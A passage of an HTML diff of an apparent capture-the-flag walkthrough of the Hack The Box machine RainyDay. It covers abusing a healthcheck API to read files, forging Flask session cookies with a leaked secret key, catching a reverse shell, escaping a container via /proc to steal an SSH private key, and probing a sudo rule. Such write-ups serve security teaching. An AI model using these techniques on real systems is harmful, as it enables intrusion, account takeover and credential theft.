+<p>This one will skip Burp, and go directly to a SOCKS on localhost 1080, which is just what Chisel is providing. I’ll add a pattern for this proxy for <code class="language-plaintext highlighter-rouge">*dev.rainycloud.htb*</code>. It comes before Burp in my priority order, so it’ll route all the traffic to dev via the tunnel. It works:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230210170451666.webp" type="image/webp"/>
+<img alt="image-20230210170451666" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230210170451666.png"/>
+</picture>
+<h3 id="enumerating-healthcheck">Enumerating healthcheck</h3>
+<h4 id="access-full-api">Access Full API</h4>
+<p>I’ll remember that <code class="language-plaintext highlighter-rouge">/api/healthcheck</code> was limited from non-local hosts. I’ll try it now via the proxy, but same result:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains curl <span class="nt">-s</span> rainycloud.htb/api/healthcheck
+<span class="go">[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.184:80  ...  OK
+{"result":true,"results":[]}
+</span></code></pre></div></div>
+<p>However, if I try it on <code class="language-plaintext highlighter-rouge">dev/rainycloud.htb</code>, it returns data:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains curl <span class="nt">-s</span> dev.rainycloud.htb/api/healthcheck | jq <span class="s1">'.'</span>
+<span class="go">[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.184:80  ...  OK
+{
+  "result": true,
+  "results": [
+    {
+      "file": "/bin/bash",
+      "pattern": {
+        "type": "ELF"
+      }
+    },
+    {
+      "file": "/var/www/rainycloud/app.py",
+      "pattern": {
+        "type": "PYTHON"
+      }
+    },
+    {
+      "file": "/var/www/rainycloud/sessions/db.sqlite",
+      "pattern": {
+        "type": "SQLITE"
+      }
+    },
+    {
+      "file": "/etc/passwd",
+      "pattern": {
+        "pattern": "^root.*",
+        "type": "CUSTOM"
+      }
+    }
+  ]
+}
+</span></code></pre></div></div>
+<p>It seems to be doing some kind of pattern matching on files. I don’t totally understand it yet. It does also give the full path to an <code class="language-plaintext highlighter-rouge">app.py</code> file which seems likely to be what’s running this website.</p>
+<h4 id="post">POST</h4>
+<p>To see what else this endpoint can do, I’ll try a POST request:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains curl <span class="nt">-X</span> POST <span class="nt">-s</span> dev.rainycloud.htb/api/healthcheck
+<span class="go">[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.184:80  ...  OK
+Unauthenticated
+</span></code></pre></div></div>
+<p>It wants auth. That suggests there is something more it can do.</p>
+<p>I’ll grab the cookie out of my authenticated session (on either the main site, or gary’s creds work on dev as well - the two pages must share the same JWT signing secret), and add that to the <code class="language-plaintext highlighter-rouge">curl</code> command:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains curl <span class="nt">-X</span> POST <span class="nt">-s</span> <span class="nt">-b</span> <span class="s2">"session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0"</span> dev.rainycloud.htb/api/healthcheck
+<span class="go">[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.184:80  ...  OK
+ERROR - missing parameter
+</span></code></pre></div></div>
+<h4 id="find-parameters">Find Parameters</h4>
+<p>The error message says it needs a parameter. I could try to fuzz this, I’ll start with an educated guess based on what I know. This took a bit of guesswork, as adding either on it’s own didn’t change the “ERROR - missing parameter” message, but with both <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">type</code> it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains curl <span class="nt">-d</span> <span class="s2">"file=/bin/bash&amp;type=ELF"</span> <span class="nt">-s</span> <span class="nt">-b</span> <span class="s2">"session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0"</span> dev.rainycloud.htb/api/healthcheck | jq <span class="nb">.</span>
+<span class="go">[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.184:80  ...  OK
+{
+  "result": true,
+  "results": [
+    {
+      "file": "/bin/bash",
+      "pattern": {
+        "type": "ELF"
+      }
+    }
+  ]
+}
+</span></code></pre></div></div>
+<h4 id="type">Type</h4>
+<p>Sending <code class="language-plaintext highlighter-rouge">file=/bin/bash&amp;type=ELF</code> returns a result of <code class="language-plaintext highlighter-rouge">true</code>. Changing <code class="language-plaintext highlighter-rouge">type</code> to <code class="language-plaintext highlighter-rouge">PYTHON</code>, <code class="language-plaintext highlighter-rouge">result</code> changes to <code class="language-plaintext highlighter-rouge">false</code> (I’ll snip out the <code class="language-plaintext highlighter-rouge">proxychains</code> message for readability from here on):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains curl <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"file=/bin/bash&amp;type=ELF"</span> <span class="nt">-s</span> <span class="nt">-b</span> <span class="s2">"session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0"</span> dev.rainycloud.htb/api/healthcheck | jq <span class="s1">'.result'</span>
+<span class="go">true
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains curl <span class="nt">-d</span> <span class="s2">"file=/bin/bash&amp;type=PYTHON"</span> <span class="nt">-s</span> <span class="nt">-b</span> <span class="s2">"session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0"</span> dev.rainycloud.htb/api/healthcheck | jq <span class="s1">'.result'</span>
+<span class="go">false
+</span></code></pre></div></div>
+<p>If I change <code class="language-plaintext highlighter-rouge">type</code> to something that wasn’t in the example, it returns a 500 error:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains curl <span class="nt">-d</span> <span class="s2">"file=/bin/bash&amp;type=0xdf"</span> <span class="nt">-s</span> <span class="nt">-b</span> <span class="s2">"session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0"</span> dev.rainycloud.htb/api/healthcheck
+<span class="go">&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;500 Internal Server Error&lt;/title&gt;
+&lt;h1&gt;Internal Server Error&lt;/h1&gt;
+&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;/p&gt;
+</span></code></pre></div></div>
+<p>If <code class="language-plaintext highlighter-rouge">type</code> is <code class="language-plaintext highlighter-rouge">CUSTOM</code>, there’s another error:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains curl <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"file=/bin/bash&amp;type=CUSTOM"</span> <span class="nt">-s</span> <span class="nt">-b</span> <span class="s2">"session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0"</span> dev.rainycloud.htb/api/healthcheck
+<span class="go">Pattern required when using custom type
+</span></code></pre></div></div>
+<p>In the example, the <code class="language-plaintext highlighter-rouge">pattern</code> was <code class="language-plaintext highlighter-rouge">^root.*</code>, which is the regular expression for starts with “root” and then followed by 0 or more of any character. My theory is that the regex is applied to the contents of the file, and <code class="language-plaintext highlighter-rouge">result</code> is set based on if it matches.</p>
+<p>To test this, I’ll experiment on <code class="language-plaintext highlighter-rouge">/etc/hostname</code>. It seems reasonable to guess that the file does not start with “a”, and sending a <code class="language-plaintext highlighter-rouge">pattern</code> of <code class="language-plaintext highlighter-rouge">^a.*</code> does return false:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains curl <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"file=/etc/hostname&amp;type=CUSTOM&amp;pattern=^a.*"</span> <span class="nt">-s</span> <span class="nt">-b</span> <span class="s2">"session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0"</span> dev.rainycloud.htb/api/healthcheck | jq .result
+<span class="go">false
+</span></code></pre></div></div>
+<p>It might reasonably start with “r”, and changing <code class="language-plaintext highlighter-rouge">pattern</code> to <code class="language-plaintext highlighter-rouge">^r.*</code> does in fact return <code class="language-plaintext highlighter-rouge">true</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains curl <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"file=/etc/hostname&amp;type=CUSTOM&amp;pattern=^r.*"</span> <span class="nt">-s</span> <span class="nt">-b</span> <span class="s2">"session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0"</span> dev.rainycloud.htb/api/healthcheck | jq .result
+<span class="go">true
+</span></code></pre></div></div>
+<h3 id="file-read">File Read</h3>
+<p>The full process of my creating a script to read files here in <a href="https://www.youtube.com/watch?v=cu_wOqZbCqw">this video</a>:</p>
+<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" height="315" src="https://www.youtube.com/embed/cu_wOqZbCqw" style="border: 0px;" title="YouTube video player" width="560"></iframe>
+<p>The final script is available <a href="https://gitlab.com/0xdf/ctfscripts/-/blob/master/htb-rainyday/file_read.py">on GitLab</a>.</p>
+<h3 id="website-access-as-jack">Website Access as jack</h3>
+<h4 id="read-web-source">Read Web Source</h4>
+<p>I’ll use the script to read the source for the web application at the path leaked by <code class="language-plaintext highlighter-rouge">/api/healthcheck</code> on dev. It’s very slow, but at the top of the file, after all the other imports, there’s an import of <code class="language-plaintext highlighter-rouge">SECRET_KEY</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3 
+</span>                                        
+<span class="kn">import</span> <span class="n">re</span>                     
+<span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">docker</span>
+<span class="kn">import</span> <span class="n">bcrypt</span>                                  
+<span class="kn">import</span> <span class="n">socket</span>       
+<span class="kn">import</span> <span class="n">string</span>
+<span class="kn">from</span> <span class="n">flask_sqlalchemy</span> <span class="kn">import</span> <span class="n">SQLAlchemy</span> 
+<span class="kn">from</span> <span class="n">os.path</span> <span class="kn">import</span> <span class="n">exists</span>
+<span class="kn">from</span> <span class="n">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
+<span class="kn">from</span> <span class="n">inspect</span> <span class="kn">import</span> <span class="n">currentframe</span><span class="p">,</span> <span class="n">getframeinfo</span> 
+<span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span> 
+<span class="kn">from</span> <span class="n">flask_limiter</span> <span class="kn">import</span> <span class="n">Limiter</span>
+<span class="kn">from</span> <span class="n">flask_limiter.util</span> <span class="kn">import</span> <span class="n">get_remote_address</span>
+
+<span class="c1">#secrets.py 
+</span><span class="kn">from</span> <span class="n">secrets</span> <span class="kn">import</span> <span class="n">SECRET_KEY</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span> <span class="n">static_url_path</span><span class="o">=</span><span class="sh">""</span><span class="p">)</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">SECRET_KEY</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">SECRET_KEY</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">SQLALCHEMY_DATABASE_URI</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">sqlite:///sessions/db.sqlite</span><span class="sh">'</span> 
+
+<span class="n">limiter</span> <span class="o">=</span> <span class="n">Limiter</span><span class="p">(</span> 
+<span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+</code></pre></div></div>
+<p>I’ll read <code class="language-plaintext highlighter-rouge">secrets.py</code> from the same directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python file_read.py /var/www/rainycloud/secrets.py
+<span class="go">SECRET_KEY = 'f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67' 
+</span></code></pre></div></div>
+<h4 id="cookie-generation">Cookie Generation</h4>
+<p>I’ll notice that when I log into the website as gary, there’s a <code class="language-plaintext highlighter-rouge">session</code> cookie that gets set. Firefox dev tools breaks it out a bit:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230214102641081.webp" type="image/webp"/>
+<img alt="image-20230214102641081" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230214102641081.png"/>
+</picture>
+<p>With three parts of base64-encoded data separated by <code class="language-plaintext highlighter-rouge">.</code>, that looks like a JWT or a Flask cookie. Given the fact that this web application is written in Flask, I’ll start there. <a href="https://github.com/Paradoxis/Flask-Unsign">flask-unsign</a> is a tool for Flask cookies. I can check if the secret key I leaked works with the cookie by passing that as the wordlist to the <code class="language-plaintext highlighter-rouge">--unsign</code> command:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>flask-unsign <span class="nt">--unsign</span> <span class="nt">--cookie</span> <span class="s1">'eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-uqBA.o46_JCuR7NsHaRVAbUnwdhaoUfI'</span> <span class="nt">-w</span> &lt;<span class="o">(</span> <span class="nb">echo</span> <span class="s2">"f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67"</span> <span class="o">)</span>
+<span class="go">[*] Session decodes to: {'username': 'gary'}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 1 attempts
+'f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67'
+</span></code></pre></div></div>
+<p>I’m using the <code class="language-plaintext highlighter-rouge">&lt;( )</code> Bash syntax to have the results of what’s in the middle be handled as if it’s in a file. It matches.</p>
+<p>With the secret I can craft cookies for any use I want. I already enumerated the users, and I’ve noticed that jack has a container running named Secrets. I’ll create a cookie as jack:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>flask-unsign <span class="nt">--sign</span> <span class="nt">--cookie</span> <span class="s2">"{'username': 'jack'}"</span> <span class="nt">--secret</span> <span class="s2">"f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67"</span>
+<span class="go">eyJ1c2VybmFtZSI6ImphY2sifQ.Y-vWgA.jUSvqhy4bQg1sgdiag_VgV_f_ec
+</span></code></pre></div></div>
+<p>I’ll add that cookie to Firefox for <code class="language-plaintext highlighter-rouge">rainycloud.htb</code> and refresh the page to be logged in as jack with access to the “secrets” container:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230214134651354.webp" type="image/webp"/>
+<img alt="image-20230214134651354" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230214134651354.png"/>
+</picture>
+<h3 id="secrets-container">secrets Container</h3>
+<h4 id="shell-1">Shell</h4>
+<p>Now with access to the secrets container, when I run commands, they run as UID 1000. For example, if I “Execute Command” and put in <code class="language-plaintext highlighter-rouge">id</code>, it returns <code class="language-plaintext highlighter-rouge">uid=1000 gid=1000</code>.  That’s different than gary’s container, which showed UID 1337 (at least for “Execute Command” - See <a href="#beyond-root">Beyond Root</a>).</p>
+<p>Just like with the previous container, secrets is running alpine-python, so I’ll grab a Python reverse shell from <a href="https://www.revshells.com/">revshells.com</a>. It only has <code class="language-plaintext highlighter-rouge">python3</code> (no <code class="language-plaintext highlighter-rouge">python</code>), so I’ll make sure that’s correct and send it as a “Execute Command (background)”, getting a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.184 55194
+</span><span class="gp">/ $ ^[[49;5R</span><span class="w">
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">script</code> isn’t installed, but I can use <code class="language-plaintext highlighter-rouge">python3</code> to get a PTY and then do the standard <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">shell upgrade</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/ $ ^[[49;5R</span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="go">python3 -c 'import pty;pty.spawn("/bin/bash")'
+Traceback (most recent call last):
+  File "&lt;string&gt;", line 1, in &lt;module&gt;
+  File "/usr/lib/python3.9/pty.py", line 158, in spawn
+    os.execlp(argv[0], *argv)
+  File "/usr/lib/python3.9/os.py", line 557, in execlp
+    execvp(file, args)
+  File "/usr/lib/python3.9/os.py", line 574, in execvp
+    _execvpe(file, args)
+  File "/usr/lib/python3.9/os.py", line 597, in _execvpe
+    exec_func(file, *argrest)
+FileNotFoundError: [Errno 2] No such file or directory
+</span><span class="gp">/ $ ^[[49;5R</span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span> <span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+</span><span class="gp">/ $</span><span class="w">
+</span></code></pre></div></div>
+<h4 id="processes">Processes</h4>
+<p>Containers are virtual spaces, but they are sharing process space with the host. Looking at the processes, it’s worth looking at what is running:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/ $</span><span class="w"> </span>ps auxww                                     
+<span class="go">PID   USER     TIME  COMMAND             
+    1 root      0:14 {systemd} /sbin/init       
+    2 root      0:00 [kthreadd]                  
+    3 root      0:00 [rcu_gp]              
+    4 root      0:00 [rcu_par_gp]        
+    5 root      0:00 [netns]        
+    7 root      0:00 [kworker/0:0H-ev]  
+    9 root      0:07 [kworker/0:1H-kb]
+...[snip]...
+ 1194 root      0:00 /usr/sbin/cron -f -P
+ 1195 1000      0:00 sleep 100000000
+ 1203 root     12:12 /usr/bin/containerd
+ 1220 root      0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+ 1229 root      0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+ 1240 root      0:00 nginx: master process /usr/sbin/nginx -g daemon on; master
+ 1241 xfs       0:25 nginx: worker process
+ 1242 xfs       1:31 nginx: worker process
+ 1255 root      2:26 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/con
+ 1482 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-po
+ 1506 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 49
+ 1520 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-po
+ 1526 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 40
+ 1541 root      0:55 /usr/bin/containerd-shim-runc-v2 -namespace moby -id c0fe8
+ 1563 root      0:26 tail -f /logfile
+...[snip]...
+</span></code></pre></div></div>
+<p>There’s a bunch of system stuff started as root. There’s a cron running as root that’s immediately followed by a really long <code class="language-plaintext highlighter-rouge">sleep</code> as uid 1000. There’s also a bunch of <code class="language-plaintext highlighter-rouge">docker</code> stuff, and then (not shown above) my exploitation stuff.</p>
+<h4 id="container-jail-escape">Container Jail Escape</h4>
+<p>The long <code class="language-plaintext highlighter-rouge">sleep</code> process is by uid 1000, which is the same id that my shell is currently running as:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/ $</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1000 gid=1000
+</span></code></pre></div></div>
+<p>I’ll go into the <code class="language-plaintext highlighter-rouge">/proc</code> folder for the long <code class="language-plaintext highlighter-rouge">sleep</code> process:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/ $</span><span class="w"> </span><span class="nb">cd</span> /proc/1195
+<span class="gp">/proc/1195 $</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">arch_status         limits              root
+attr                loginuid            sched
+autogroup           map_files           schedstat
+auxv                maps                sessionid
+cgroup              mem                 setgroups
+clear_refs          mountinfo           smaps
+cmdline             mounts              smaps_rollup
+comm                mountstats          stack
+coredump_filter     net                 stat
+cpu_resctrl_groups  ns                  statm
+cpuset              numa_maps           status
+cwd                 oom_adj             syscall
+environ             oom_score           task
+exe                 oom_score_adj       timens_offsets
+fd                  pagemap             timers
+fdinfo              patch_state         timerslack_ns
+gid_map             personality         uid_map
+io                  projid_map          wchan
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">cwd</code>  is a symlink to the actual working directory, and it points to <code class="language-plaintext highlighter-rouge">/home/jack</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/proc/1195 $</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> cwd
+<span class="go">lrwxrwxrwx    1 1000     1000             0 Feb 14 19:07 cwd -&gt; /home/jack
+</span></code></pre></div></div>
+<p>That isn’t in the container, but rather on the host. The container is <code class="language-plaintext highlighter-rouge">chroot</code>-ed into the container part of the host file system (I’ve looked at this before in <a href="/2021/05/17/digging-into-cgroups.html">container breakouts</a> and in <a href="/2022/09/10/htb-scanned.html#sandbox-exploit">Scanned</a>).</p>
+<p>But with this foothold into the host file system, I can look outside the jail and into that directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/proc/1195 $</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> cwd/
+<span class="go">total 36
+drwxr-x---    4 1000     1000          4096 Feb 14 18:52 .
+drwxr-xr-x    4 root     root          4096 Sep 29 13:47 ..
+lrwxrwxrwx    1 root     root             9 Sep 29 12:16 .bash_history -&gt; /dev/null
+-rw-r--r--    1 1000     1000           220 Jan  6  2022 .bash_logout
+-rw-r--r--    1 1000     1000          3771 Jan  6  2022 .bashrc
+drwx------    2 1000     1000          4096 Feb 10 22:44 .cache
+-rw-r--r--    1 1000     1000           807 Jan  6  2022 .profile
+drwx------    2 1000     1000          4096 Sep 29 13:47 .ssh
+-rw-------    1 1000     1000          1423 Feb 14 18:52 .viminfo
+-rw-r-----    1 root     1000            33 Feb  9 22:11 user.txt
+</span></code></pre></div></div>
+<p>And even read <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/proc/1195 $</span><span class="w"> </span><span class="nb">cat </span>cwd/user.txt
+<span class="go">8ad82817************************
+</span></code></pre></div></div>
+<p>There’s also a key in <code class="language-plaintext highlighter-rouge">.ssh</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/proc/1195 $</span><span class="w"> </span><span class="nb">ls </span>cwd/.ssh
+<span class="go">authorized_keys  id_rsa           known_hosts
+</span><span class="gp">/proc/1195 $</span><span class="w"> </span><span class="nb">cat </span>cwd/.ssh/id_rsa
+<span class="go">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEA7Ce/LAvrYP84rAa7QU51Y+HxWRC5qmmVX4wwiCuQlDqz73uvRkXq
+qdDbDtTCnJUVwNJIFr4wIMrXAOvEp0PTaUY5xyk3KW4x9S1Gqu8sV1rft3Fb7rY1RxzUow
+SjS+Ew+ws4cpAdl/BvrCrw9WFwEq7QcskUCON145N06NJqPgqJ7Z15Z63NMbKWRhvIoPRO
+JDhAaulvxjKdJr7AqKAnt+pIJYDkDeAfYuPYghJN/neeRPan3ue3iExiLdk7OA/8PkEVF0
+...[snip]...
+</span></code></pre></div></div>
+<p>It turns out this same vulnerability works in the original container, allowing for skipping of the file read. I’ll look at why in <a href="#beyond-root">Beyond Root</a>.</p>
+<h3 id="ssh">SSH</h3>
+<p>That key works to get a SSH connection as jack on the host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/rainyday-jack jack@rainycloud.htb 
+<span class="go">Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-50-generic x86_64)
+...[snip]...
+</span><span class="gp">jack@rainyday:~$</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-as-jack_adm">Shell as jack_adm</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>jack can run <code class="language-plaintext highlighter-rouge">safe_python</code> as jack_adm without a password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack@rainyday:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for jack on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jack may run the following commands on localhost:
+    (jack_adm) NOPASSWD: /usr/bin/safe_python *
+</span></code></pre></div></div>
+<p>Interestingly, jack can’t read this script:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack@rainyday:~$</span><span class="w"> </span><span class="nb">cat</span> /usr/bin/safe_python 
+<span class="go">cat: /usr/bin/safe_python: Permission denied
+</span><span class="gp">jack@rainyday:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/bin/safe_python
+<span class="go">-rwxr-x--- 1 root jack_adm 710 Jun  5  2022 /usr/bin/safe_python
+</span></code></pre></div></div>
+<h3 id="safe_python">safe_python</h3>
+<h4 id="find-input">Find Input</h4>
+<p>I’ll run the script as jack_adm and it crashes, trying to open <code class="language-plaintext highlighter-rouge">sys.argv[1]</code> as a file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack@rainyday:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> jack_adm safe_python
+<span class="go">Traceback (most recent call last):
+  File "/usr/bin/safe_python", line 28, in &lt;module&gt;
+    with open(sys.argv[1]) as f:
+IndexError: list index out of range
+</span></code></pre></div></div>
+<p>If I create an empty file and pass that in, nothing happens:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack@rainyday:/tmp$</span><span class="w"> </span><span class="nb">touch test</span>
+<span class="gp">jack@rainyday:/tmp$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> jack_adm safe_python ./test 
+</code></pre></div></div>
+<p>If I add some text to it, it crashes again:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack@rainyday:/tmp$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> jack_adm safe_python ./test 
+<span class="go">Traceback (most recent call last):
+  File "/usr/bin/safe_python", line 29, in &lt;module&gt;
+    exec(f.read(), env)
+  File "&lt;string&gt;", line 1
+    0xdf was here
+         ^^^
+SyntaxError: invalid syntax
+</span></code></pre></div></div>
+<p>It’s passing the contents of the file to <code class="language-plaintext highlighter-rouge">exec</code>.</p>
+<h4 id="exec-background">exec Background</h4>
+<p>The Python <code class="language-plaintext highlighter-rouge">exec</code> function is a builtin function <a href="https://docs.python.org/3/library/functions.html#exec">documented here</a>.</p>
+<blockquote>
